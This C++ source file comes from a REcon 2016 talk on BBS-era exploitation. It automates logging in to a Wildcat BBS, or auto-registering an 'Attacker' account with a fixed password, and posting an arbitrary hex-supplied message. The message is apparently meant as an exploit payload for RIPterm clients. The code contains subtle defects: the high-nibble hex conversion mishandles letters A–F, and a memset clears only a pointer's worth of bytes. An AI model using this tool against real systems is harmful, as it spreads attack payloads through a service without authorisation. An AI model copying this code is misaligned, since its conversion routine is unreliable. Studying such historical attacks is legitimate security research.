////////////////////////////////////////////////////////////////
// wildcatpost.cpp
//==============================================================
//
//  BBS-Era Exploitation for Fun and Anachronism
//  REcon 2016
//
//  Derek Soeder and Paul Mehta
//  Cylance, Inc.
//______________________________________________________________
//
// Post an arbitrary message to Wildcat BBS.
//
// Note that both Wildcat and RIPterm may impose restrictions
// and transformations on the characters they receive.
//
// July 1, 2016
//
////////////////////////////////////////////////////////////////

#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")



////////////////////////////////////////////////////////////////
// Communication
////////////////////////////////////////////////////////////////

////////////////////////////////
// drain
////////////////////////////////
bool drain(
        HANDLE                  hConnection )
{
        DWORD                   cb, cbavail;
        BYTE                    rgbbuf[2048];
        fd_set                  fdread;
        timeval                 tv;
        int                     n;

        //----------------
        for ( ; ; )
        {
                cbavail = 0;
                if (PeekNamedPipe( hConnection, NULL, 0, NULL, &cbavail, NULL ))
                {
                        if (cbavail == 0) break;
                }
                else
                {
                        FD_ZERO(&fdread);
                        FD_SET((SOCKET)hConnection, &fdread);

                        tv.tv_sec  = 0;
                        tv.tv_usec = 0;
                        n = select( 1, &fdread, 0, 0, &tv );

                        if (n < 0)
                                return false;
                        else if (n == 0 || !FD_ISSET((SOCKET)hConnection, &fdread))
                                break;
                }

                cb = 0;
                if (!ReadFile( hConnection, rgbbuf, cbavail, &cb, NULL ) || cb == 0)
                        return false;

                printf( "%.*s", cb, rgbbuf );
        } //for(;;)

        return true;
} //drain


////////////////////////////////
// read_byte
////////////////////////////////
int read_byte(
        HANDLE                  hConnection )
{
        BYTE                    b;
        DWORD                   cb;

        //----------------
        if (!ReadFile( hConnection, &b, 1, &cb, NULL ) || cb != 1)
                return -1;

        return b;
} //read_byte


////////////////////////////////
// write_byte
////////////////////////////////
bool write_byte(
        HANDLE                  hConnection,
        BYTE                    b )
{
        DWORD                   cb;

        //----------------
        return (WriteFile( hConnection, &b, 1, &cb, NULL ) && cb == 1);
} //write_byte


////////////////////////////////
// write_raw
////////////////////////////////
bool write_raw(
        HANDLE                  hConnection,
        const void              * pData,
        int                     cbData )
{
        DWORD                   cb;

        //----------------
        return (WriteFile( hConnection, pData, (DWORD)cbData, &cb, NULL ) && cb == (DWORD)cbData);
} //write_raw


////////////////////////////////
// write_string
////////////////////////////////
bool write_string(
        HANDLE                  hConnection,
        const char              * szString )
{
        return write_raw( hConnection, szString, (DWORD) strlen( szString ) );
} //write_string


////////////////////////////////
// write_string_and_drain
////////////////////////////////
bool write_string_and_drain(
        HANDLE                  hConnection,
        const char              * szString )
{
        if (!write_string( hConnection, szString ))
                return false;

        Sleep( 200 );

        return drain( hConnection );
} //write_string_and_drain



////////////////////////////////////////////////////////////////
// Main
////////////////////////////////////////////////////////////////

////////////////////////////////
// parse_message
////////////////////////////////
char * parse_message(
        FILE                    * f,
        size_t                  * pcchLength )
{
        char                    szbuf[2048];
        size_t                  cblength, cbcapacity;
        char                    * szmsg;
        int                     i;
        BYTE                    b, b2;

        //----------------
        cblength   = 0;
        cbcapacity = 2048;
        szmsg      = (char *) malloc( cbcapacity );

        if (!szmsg) return 0;

        while (!feof( f ))
        {
                if (!fgets( szbuf, sizeof(szbuf), f ))
                        break;  // assume EOF

                szbuf[sizeof(szbuf) - 1] = '\0';
                if (strlen( szbuf ) >= sizeof(szbuf) - 1)
                {
                        free( szmsg );
                        return 0;
                }

                for (i = 0; ; i++)
                        if (szbuf[i] != ' ' && szbuf[i] != '\t') break;

                if (szbuf[i] == '\0' || szbuf[i] == '\n' || szbuf[i] == '\r')
                        break;

                for ( ; ; i++)
                {
                        switch (b = (BYTE)szbuf[i])
                        {
                        case '\0': case '\n': case '\r':
                                goto _eol;

                        case '\t': case ' ': break;

                        case 'a': case 'b': case 'c': case 'd': case 'e': case 'f':
                                b -= 0x20;
                        case 'A': case 'B': case 'C': case 'D': case 'E': case 'F':
                                b -= ('A' - '0' + 10);
                        case '0': case '1': case '2': case '3': case '4':
                        case '5': case '6': case '7': case '8': case '9':
                                b -= '0';

                                switch (b2 = (BYTE)szbuf[++i])
                                {
                                case 'a': case 'b': case 'c': case 'd': case 'e': case 'f':
                                        b2 -= 0x20;
                                case 'A': case 'B': case 'C': case 'D': case 'E': case 'F':
                                        b2 -= ('A' - '0' - 10);
                                case '0': case '1': case '2': case '3': case '4':
                                case '5': case '6': case '7': case '8': case '9':
                                        b2 -= '0';

                                        if (cblength == cbcapacity - 1)
                                        {
                                                if (cbcapacity >= 0x01000000)
                                                {
                                                        free( szmsg );
                                                        return 0;
                                                }

                                                cbcapacity *= 2;
                                                szmsg = (char *) realloc( szmsg, cbcapacity );
                                                if (!szmsg) return 0;
                                        }

                                        szmsg[cblength++] = (char)((b << 4) + b2);
                                        break;

                                default:
                                        free( szmsg );
                                        return 0;
                                } //switch(b2)
                                break;
                        } //switch(b)
                } //for(;;)

        _eol:
                if (cblength == cbcapacity - 1)
                {
                        if (cbcapacity >= 0x01000000)
                        {
                                free( szmsg );
                                return 0;
                        }

                        cbcapacity *= 2;
                        szmsg = (char *) realloc( szmsg, cbcapacity );
                        if (!szmsg) return 0;
                }

                szmsg[cblength++] = '\r';
        } //while

        szmsg[cblength] = '\0';

        if (pcchLength) *pcchLength = cblength;

        return szmsg;
} //parse_message


////////////////////////////////
// parse_endpoint
////////////////////////////////
bool parse_endpoint(
        const char              * szEndpoint,
        const char *            * pszPipeName,
        sockaddr_in             * psinPeer )
{
        char                    szip[16];
        const char              * pch;
        int                     nport;

        //----------------
        *pszPipeName = 0;
        memset( psinPeer, 0, sizeof(psinPeer) );

        if (memcmp( szEndpoint, "\\\\.\\", 4 ) == 0)
        {
                *pszPipeName = szEndpoint;
                return true;
        }

        pch = strchr( szEndpoint, ':' );
        if (!pch || (pch - szEndpoint) >= sizeof(szip))
                return false;

        memcpy( szip, szEndpoint, (pch - szEndpoint) );
        szip[pch - szEndpoint] = '\0';

        if ( (psinPeer->sin_addr.S_un.S_addr = inet_addr( szip )) == INADDR_NONE ||
             sscanf_s( pch + 1, "%d", &nport ) != 1 || nport <= 0 || nport > 65535 )
        {
                return false;
        }

        psinPeer->sin_family = AF_INET;
        psinPeer->sin_port   = htons( (u_short)nport );
        return true;
} //parse_endpoint


////////////////////////////////
// main
////////////////////////////////
int main(
        int                     argc,
        const char *            argv[] )
{
        WSADATA                 wsa;
        sockaddr_in             sin;
        const char              * szpipe;
        HANDLE                  hconn;

        char                    * szmsg;
        size_t                  cchmsg;

        DWORD                   dwticks;
        DWORD                   cb;

        fd_set                  fdread;
        timeval                 tv;
        int                     n;

        FILETIME                ft;
        char                    szbuf[64];
        const char              * pchfirst;
        const char              * pchlast;
        const char              * pchpass;

        //---------------- parse command line and initialize
        if (WSAStartup( MAKEWORD(2,0), &wsa ) != 0)
        {
                fprintf( stderr, "%s: WSAStartup failed with error %u\n", argv[0], GetLastError() );
                return 1;
        }

        if (argc != 5 || !parse_endpoint( argv[1], &szpipe, &sin ))
        {
                fprintf( stderr, "Usage: %s { \\\\.\\PIPE\\namedpipe | ipv4address:tcpport } { first last password | * * * }\n\n"
                                 "Where:  first  is the login user's first name\n"
                                 "         last  is the login user's last name\n"
                                 "     password  is the login user's password\n\n"
                                 "Specify * * * for the login user to automatically create an account.\n\n"
                                 "Supply the message via stdin as lines of consecutive hexadecimal characters.\n"
                                 "For example:\n\n"
                                 "  217C2A\n"
                                 "  217C317741414141\n\n"
                                 "Terminate the message with an empty line.\n", argv[0] );
                return 1;
        }

        //---------------- read message from stdin
        szmsg = parse_message( stdin, &cchmsg );
        if (!szmsg)
        {
                fprintf( stderr, "%s: failed to parse message\n", argv[0] );
                return 1;
        }

        //---------------- connect to endpoint and wait for any data
        if (szpipe)
        {
                hconn = CreateFileA(
                        argv[1],
                        GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                        NULL,
                        OPEN_EXISTING,
                        SECURITY_SQOS_PRESENT|SECURITY_IDENTIFICATION,
                        NULL );

                if (hconn == INVALID_HANDLE_VALUE || hconn == NULL)
                {
                        fprintf( stderr, "%s: CreateFile failed with error %u\n", argv[0], GetLastError() );
                        free( szmsg );
                        WSACleanup();
                        return 1;
                }

                for (dwticks = GetTickCount(); ; )
                {
                        if (!PeekNamedPipe( hconn, szbuf, 1, NULL, &cb, NULL ))
                        {
                                fprintf( stderr, "%s: PeekNamedPipe failed with error %u\n", argv[0], GetLastError() );
                                CloseHandle( hconn );
                                free( szmsg );
                                WSACleanup();
                                return 1;
                        }

                        if (cb != 0) break;

                        if (GetTickCount() - dwticks >= 5000)
                        {
                                cb = 0;
                                if (!WriteFile( hconn, "14\r", 3, &cb, NULL ) || cb != 3)
                                {
                                        fprintf( stderr, "%s: WriteFile failed with error %u, %u/%u written\n", argv[0], GetLastError(), cb, 3 );
                                        CloseHandle( hconn );
                                        free( szmsg );
                                        WSACleanup();
                                        return 1;
                                }
                                break;
                        }
                } //for(;;)
        } //if(pipe)
        else
        {
                hconn = (HANDLE) WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
                if (hconn == (HANDLE)INVALID_SOCKET || hconn == INVALID_HANDLE_VALUE || hconn == NULL)
                {
                        fprintf( stderr, "%s: WSASocket failed with error %d\n", argv[0], WSAGetLastError() );
                        free( szmsg );
                        WSACleanup();
                        return 1;
                }

                if (connect( (SOCKET)hconn, (sockaddr *)&sin, sizeof(sin) ) != 0)
                {
                        fprintf( stderr, "%s: connect failed with error %d\n", argv[0], WSAGetLastError() );
                        closesocket( (SOCKET)hconn );
                        free( szmsg );
                        WSACleanup();
                        return 1;
                }

                FD_ZERO(&fdread);
                FD_SET((SOCKET)hconn, &fdread);

                tv.tv_sec  = 5;
                tv.tv_usec = 0;
                n = select( 1, &fdread, 0, 0, &tv );

                if (n < 0)
                {
                        fprintf( stderr, "%s: select failed with error %d\n", argv[0], WSAGetLastError() );
                        shutdown( (SOCKET)hconn, SD_BOTH );
                        closesocket( (SOCKET)hconn );
                        free( szmsg );
                        WSACleanup();
                        return 1;
                }
                else if (n == 0 || !FD_ISSET((SOCKET)hconn, &fdread))
                {
                        // didn't receive anything; send a "14" result code in case it's expecting something from the modem
                        if (send( (SOCKET)hconn, "14\r", 3, 0 ) != 3)
                        {
                                fprintf( stderr, "%s: send(\"14\\r\") failed with error %d\n", argv[0], WSAGetLastError() );
                                shutdown( (SOCKET)hconn, SD_BOTH );
                                closesocket( (SOCKET)hconn );
                                free( szmsg );
                                WSACleanup();
                                return 1;
                        }
                }
        } //if-else(ip:port)

        //---------------- log in
        if (strcmp( argv[2], "*" ) == 0 && strcmp( argv[3], "*" ) == 0 && strcmp( argv[4], "*" ) == 0)
        {
                GetSystemTimeAsFileTime( &ft );
                sprintf_s( szbuf, sizeof(szbuf), "%08X%08X", ft.dwHighDateTime, ft.dwLowDateTime );

                pchfirst = "Attacker";
                pchlast  = szbuf;
                pchpass  = 0;
        }
        else
        {
                pchfirst = argv[2];
                pchlast  = argv[3];
                pchpass  = argv[4];
        }

        Sleep( 500 );

        write_string_and_drain( hconn, pchfirst );
        write_string_and_drain( hconn, "\r" );

        write_string_and_drain( hconn, pchlast );
        write_string_and_drain( hconn, "\r" );

        if (pchpass)
        {
                write_string_and_drain( hconn, pchpass );
                write_string_and_drain( hconn, "\r" );
        }
        else
        {
                write_string_and_drain( hconn, "y\r" );
                write_string_and_drain( hconn, "Attack, AK\ry\r" );
                write_string_and_drain( hconn, "Password1!\rPassword1!\r" );
                write_string_and_drain( hconn, "Attacker\ry\r" );
                write_string_and_drain( hconn, "010101\ry\r" );
                write_string_and_drain( hconn, "1111111111\ry\r" );
                write_string_and_drain( hconn, "\r" );
                write_string_and_drain( hconn, "A\r" );
                write_string_and_drain( hconn, "y\r" );
                write_string_and_drain( hconn, "\r" );
        }

        write_string_and_drain( hconn, "\r" );

        //---------------- send message
        write_string_and_drain( hconn, "M\r" );
        write_string_and_drain( hconn, "E\r" );
        write_string_and_drain( hconn, "\r" );
        write_string_and_drain( hconn, "Attack\r" );

        write_string_and_drain( hconn, szmsg );
        write_string_and_drain( hconn, "\r" );

        //---------------- log off, clean up, and exit
        write_string_and_drain( hconn, "S\r" );
        write_string_and_drain( hconn, "A\r" );

        Sleep( 200 );

        write_string_and_drain( hconn, "G\r" );
        write_string_and_drain( hconn, "y\r" );

        drain( hconn );
        Sleep( 1000 );
        drain( hconn );

        CloseHandle( hconn );

        free( szmsg );
        WSACleanup();
        return 0;
} //main
